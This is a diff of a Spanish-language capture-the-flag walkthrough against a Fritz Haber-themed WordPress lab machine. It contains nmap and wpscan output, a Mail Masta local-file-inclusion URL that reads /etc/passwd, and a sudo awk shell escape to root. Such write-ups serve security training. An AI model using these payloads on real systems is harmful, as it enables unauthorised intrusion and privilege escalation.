@@ -1,7 +1,53 @@
-ESCANEO 
+# Ruta de explotación
 
-wpscan --url http://192.168.1.103:7664 -e ap --plugins-detection aggressive
+## Escaneo Nmap de Puertos y Servicios
+
+Escaneo completo de todos los puertos con detección de versiones, sistema operativo y scripts predeterminados. Se descubren dos puertos abiertos: el puerto 22/tcp ejecutando OpenSSH 8.9p1 para acceso remoto seguro, y el puerto 7664/tcp alojando un servidor web lighttpd 1.4.63 con un sitio WordPress 7.0.1 titulado "Fritz Haber – La Enciclopedia Libre". 
+
 ```bash
+sudo nmap -p- -sV -O -sC -v IP
+
+──(kali㉿kali)-[~]
+└─$ sudo nmap -p- -sV -O -sC -v 192.168.184.140
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 10:08 +0200
+Scanning 192.168.184.140 [65535 ports]
+Discovered open port 22/tcp on 192.168.184.140
+Discovered open port 7664/tcp on 192.168.184.140
+Completed SYN Stealth Scan at 10:08, 6.32s elapsed (65535 total ports)
+Initiating Service scan at 10:08
+Scanning 2 services on 192.168.184.140
+Host is up (0.0018s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 74:2b:e3:70:6f:ad:35:e7:91:f7:66:28:32:29:ce:7d (ECDSA)
+|_  256 1e:4e:bd:99:bf:15:ed:9d:ec:f6:0f:84:9d:95:29:b0 (ED25519)
+7664/tcp open  http    lighttpd 1.4.63
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-generator: WordPress 7.0.1
+|_http-server-header: lighttpd/1.4.63
+|_http-title: Fritz Haber &#8211; La Enciclopedia Libre
+MAC Address: 00:0C:29:54:A8:C3 (VMware)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Uptime guess: 21.826 days (since Tue Jun 23 14:19:18 2026)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+##  Escaneo WPScan de WordPress
+
+Escaneo de seguridad del sitio WordPress alojado en el puerto 7664, identificando la versión 7.0.1 del CMS con el tema twentytwentyfive. Se detectan endpoints sensibles como XML-RPC habilitado, readme.html y wp-cron.php accesibles. El plugin Akismet 5.7 se encuentra instalado, pero lo más relevante es el plugin Mail Masta 1.0, ubicado en /wp-content/plugins/mail-masta/, el cual presenta un historial de vulnerabilidades conocidas que podrían ser explotadas para obtener acceso al sistema.
+
+```bash
+wpscan --url http://IP:7664 -e ap --plugins-detection aggressive
+
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -115,14 +161,13 @@ Interesting Finding(s):
 [+] Data Received: 16.001 MB
 [+] Memory used: 458.059 MB
 [+] Elapsed time: 00:02:55
-
 ```
 
 MAIL-MASTA vulnerabildiad CVE-2016-10956
 
 Se saca el usuario
 
-http://192.168.184.140:7664/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+http://IP:7664/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 
 ```bash
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false syslog:x:106:113::/home/syslog:/usr/sbin/nologin uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:113:65534::/run/sshd:/usr/sbin/nologin haber_fritz:x:1000:1000:Fritz Haber:/home/haber_fritz:/bin/bash lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false 
@@ -267,3 +312,14 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 whoami
 root
 
+
+[ Atacante (Kali) ]
+       │
+       ▼ (LFI en WordPress)
+[ user: haber_fritz ]  <-- (Sabe de química y procesos industriales)
+       │
+       ▼ (Movimiento Lateral: Tarea Cron / Script inseguro)
+[ user: clara_immerwahr ] <-- (Su esposa, química brillante y pacifista opositora)
+       │
+       ▼ (Escalada de Privilegios: GTFOBins vía sudo o SUID)
+[ ROOT ]
